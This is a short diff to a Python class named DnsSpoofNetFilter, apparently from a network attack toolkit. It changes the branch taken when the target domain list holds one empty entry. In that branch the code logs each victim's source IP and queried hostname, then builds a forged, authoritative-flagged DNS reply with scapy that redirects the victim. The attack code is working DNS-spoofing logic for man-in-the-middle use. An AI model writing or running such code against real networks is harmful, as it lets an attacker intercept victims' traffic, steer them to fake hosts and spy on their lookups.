@@ -72,7 +72,9 @@ class DnsSpoofNetFilter(object):
                 packet.set_payload(str(spoofed_pkt))
                 send(spoofed_pkt,verbose=False)
                 packet.accept()
-            elif len(self.domain) == 0:
+            elif len(self.domain) == 1 and self.domain[0] == '':
+                self.logDNS.info('Target: {} -> ({}/DNS server) has searched for: {}'.format(pkt[IP].src,
+                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                 UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
